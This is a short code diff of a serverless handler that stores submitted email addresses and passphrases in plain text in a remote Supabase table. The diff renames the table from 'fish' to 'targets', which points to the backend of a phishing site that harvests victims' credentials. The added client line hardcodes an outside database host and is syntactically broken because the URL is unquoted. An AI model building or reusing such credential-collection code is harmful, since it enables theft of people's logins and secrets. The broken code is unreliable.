@@ -17,11 +17,11 @@ export default async function handler(req, res) {
         return res.status(500).json({error: "Internal Server Error: Supabase credentials missing."})
     }
 
-    const supabase = createClient(supabaseUrl, supabaseAnonKey);
+    const supabase = createClient(https://bcjvkuiuqjkefyoholog.supabase.co, process.env.SUPABASE_KEY);
 
     try {
       const { error } = await supabase
-        .from('fish') // Table name changed to 'fish'
+        .from('targets') // Table name changed to 'fish'
         .insert([{ email, passphrase }]); // Storing plain text!
 
       if (error) {
